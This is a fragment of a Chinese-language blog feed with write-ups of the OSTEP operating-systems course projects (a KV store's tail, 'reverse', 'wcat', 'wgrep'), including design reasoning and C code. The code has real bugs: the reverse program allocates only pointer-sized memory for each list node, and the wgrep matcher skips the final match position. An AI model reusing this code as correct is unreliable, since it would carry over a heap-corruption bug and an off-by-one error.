class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关&lt;a href=&quot;https://github.com/remzi-arpacidusseau/ostep-projects&quot;&gt;课程项目&lt;/a&gt; 的 KV 部分，包含个人的代码实现和设计思路。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
    <category term="Linux" scheme="http://lordaeronesz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP Projects：Reverse</title>
    <link href="http://lordaeronesz.github.io/2024/05/06/OSTEP%20Projects%EF%BC%9AReverse/"/>
    <id>http://lordaeronesz.github.io/2024/05/06/OSTEP%20Projects%EF%BC%9AReverse/</id>
    <published>2024-05-06T01:03:08.000Z</published>
    <updated>2024-05-06T11:51:49.235Z</updated>
    
    <content type="html"><![CDATA[<p>本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关<a href="https://github.com/remzi-arpacidusseau/ostep-projects">课程项目</a> 的 Reverse 部分，包含个人的代码实现和设计思路。</p><span id="more"></span><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>题目的要求很简单：按行读取数据，读取完成后将所读取到的所有行反向输出（行间反向，行内不变）。但代码实现上却包含不少细节。</p><p>首先是核心问题：如何将读取到行反向输出？首先可以确定的一点是：<strong>在所有行读取完成之前，读取到的每一个行都需要进行保存。</strong>那么，利用什么数据结构进行保存呢？我们需要这个数据结构能够确定输入的不同行之间的前后相对关系，因此想到使用<strong>线性表</strong>。由于最终读取到的行数是不确定的，因此不能使用一个固定大小的数组，而应该使用可变长的线性表，如链表、动态数组。而又因为可变数组的扩容操作比较耗时，且我们并不需要对元素进行随机访问，只需要最后输出的时候进行顺序遍历，因此链表就成为了最佳选择。</p><p>反转的具体实现可以参考经典问题<a href="https://leetcode.cn/problems/reverse-linked-list/">反转链表</a>，设定一个前驱结点 pre 和当前结点 cur，每次读取到新的行，就动态申请存储该行数据的内存空间，并将 cur 指向这块内存空间，然后将 cur 的 next 域指向 pre，然后 pre 再指向 cur，以便进行下一行的操作。</p><p>根据 README 的说明，当输入文件和输出文件是同一个文件时，程序打印相关错误信息并退出。这里一个简单的想法是使用 <code>strcmp(argv[1], argv[2])</code> 判断两个参数字符串是否相同，但文件路径的表示方式并不是唯一的，如 <code>./t1.txt</code> 和 <code>t1.txt</code> 字符串不同，但表示的却是同一个文件。一个正确的做法是使用 <code>stat()</code> 函数，用以获取文件的状态信息，并对比输入与输出文件的状态信息是否相同。</p><p>最后，输入输出部分代码的实现可以封装为一个函数，并引入参数 <code>FILE*</code>，其中标准输入（<code>stdin</code>）和标准输出（<code>stdout</code>）可以看作是一个抽象的文件，并使用 <code>fprintf()</code> 进行文件写入。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">LineNode</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> line_buf<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">LineNode</span><span class="token operator">*</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> line_node<span class="token punctuation">;</span><span class="token comment">// 判断两个路径是否表示同一个文件</span><span class="token keyword">int</span> <span class="token function">is_same_file</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> file1<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> file2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">stat</span> sb1<span class="token punctuation">,</span> sb2<span class="token punctuation">;</span><span class="token function">stat</span><span class="token punctuation">(</span>file1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sb1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">stat</span><span class="token punctuation">(</span>file2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sb2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> sb1<span class="token punctuation">.</span>st_dev <span class="token operator">==</span> sb2<span class="token punctuation">.</span>st_dev <span class="token operator">&amp;&amp;</span> sb1<span class="token punctuation">.</span>st_ino <span class="token operator">==</span> sb2<span class="token punctuation">.</span>st_ino<span class="token punctuation">;</span> <span class="token comment">// 设备ID和inode号均相同</span><span class="token punctuation">&#125;</span><span class="token comment">// 从文件fp中读取行数据</span>line_node<span class="token operator">*</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>FILE<span class="token operator">*</span> fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> cur <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// 当前结点</span>line_node<span class="token operator">*</span> pre <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// 前置结点</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cur <span class="token operator">=</span> <span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>cur<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 读到文件末尾，删去当前无效结点并结束循环</span>line_node<span class="token operator">*</span> temp <span class="token operator">=</span> cur<span class="token punctuation">;</span>cur <span class="token operator">=</span> pre<span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>cur<span class="token operator">-></span>next <span class="token operator">=</span> pre<span class="token punctuation">;</span> <span class="token comment">// 链表反转</span>pre <span class="token operator">=</span> cur<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> cur<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 写入反转后的数据到文件fp</span><span class="token keyword">void</span> <span class="token function">write_to_file</span><span class="token punctuation">(</span>line_node<span class="token operator">*</span> cur<span class="token punctuation">,</span> FILE<span class="token operator">*</span> fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> cur<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> temp <span class="token operator">=</span> cur<span class="token punctuation">;</span>cur <span class="token operator">=</span> cur<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>line_node<span class="token operator">*</span> cur <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cur <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write_to_file</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">>=</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> argc <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"reverse: cannot open file '%s'\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>cur <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">write_to_file</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp2 <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp2 <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"reverse: cannot open file '%s'\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_same_file</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"reverse: input and output file must differ\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">write_to_file</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> fp2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"usage: reverse &lt;input> &lt;output>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关&lt;a href=&quot;https://github.com/remzi-arpacidusseau/ostep-projects&quot;&gt;课程项目&lt;/a&gt; 的 Reverse 部分，包含个人的代码实现和设计思路。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
    <category term="Linux" scheme="http://lordaeronesz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP Projects：Unix Utilities</title>
    <link href="http://lordaeronesz.github.io/2024/05/04/OSTEP%20Projects%EF%BC%9AUnix%20Utilities/"/>
    <id>http://lordaeronesz.github.io/2024/05/04/OSTEP%20Projects%EF%BC%9AUnix%20Utilities/</id>
    <published>2024-05-04T01:03:08.000Z</published>
    <updated>2024-05-04T10:24:21.316Z</updated>
    
    <content type="html"><![CDATA[<p>本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关<a href="https://github.com/remzi-arpacidusseau/ostep-projects">课程项目</a> 的 Unix Utilities 部分，包含个人的代码实现和设计思路。</p><span id="more"></span><h1 id="wcat"><a href="#wcat" class="headerlink" title="wcat"></a>wcat</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>要实现一个 <code>wcat</code> 命令，打印从文件中读取到的所有字符。</p><p>编写一个 for 循环遍历所有的参数（需要读取的文件的路径），打开该文件，依照 README 中的提示使用 <code>fgets()</code> 每次读取一行，并将读取到的字符串打印到标准输出即可。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUF_SIZE</span> <span class="token expression"><span class="token number">1024</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span> buffer<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wcat: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="wgrep"><a href="#wgrep" class="headerlink" title="wgrep"></a>wgrep</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>要实现一个 <code>wgrep</code> 命令，进行字符串匹配。</p><p>根据 README 中的提示，本题测试样例中一行的字符可能会很长，因此建议使用 <code>getline()</code> 这类动态分配内存的函数（无需预先指定缓冲区大小）。这里要求当只有一个参数 <code>term</code> 时，从标准输入中读取字符串，读取方式与从文件中读取一致，区别在于文件流参数的不同：从文件中读取为调用 <code>fopen()</code> 返回的指针，而从标准输入读取为 <code>stdin</code>。</p><p>每次读取一行字符串后，需要判断该字符串中是否存在指定的子串 <code>term</code>，这就回到了经典的字符串匹配的问题上。为了代码编写的方便，这里我使用的是最简单的朴素字符串匹配算法，当然也可以使用有限自动机、KMP 算法、Boyer-Moore 算法等更为高效的算法，值得注意的是，Unix 系统的 <code>grep</code> 命令使用的正是 Boyer-Moore 算法。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token comment">// 朴素字符串匹配算法</span><span class="token keyword">int</span> <span class="token function">match</span><span class="token punctuation">(</span><span class="token keyword">char</span> term<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> m<span class="token punctuation">,</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> m<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token operator">-</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>term<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> buffer<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wgrep: searchterm [file ...]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span><span class="token operator">*</span> term <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> m <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> buffer <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">ssize_t</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 从标准输入中读取</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">match</span><span class="token punctuation">(</span>term<span class="token punctuation">,</span> m<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wgrep: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 判断字符串是否匹配</span><span class="token keyword">if</span> <span class="token 